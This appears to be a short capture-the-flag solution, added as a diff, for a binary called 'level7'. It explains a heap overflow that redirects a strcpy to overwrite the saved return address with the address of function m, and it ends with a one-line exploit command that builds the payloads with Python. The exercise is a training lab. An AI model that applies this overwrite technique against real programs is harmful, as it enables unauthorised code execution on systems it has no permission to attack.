@@ -1,1 +1,7 @@
+program does 4 calls to malloc of size 8
+with gdb we can see that we can overflow
+and change the dest and src of the second strcpy
+we need to call fonction m
+we can see that saved eip is at 0xbffff73c
+we need to replace that value with function m wich is 0x080484f4
 ./level7 `python -c 'print("a"*20+ "\xbf\xff\xf7\x3c"[::-1])'` `python -c 'print("\x08\x04\x84\xf4"[::-1])'`
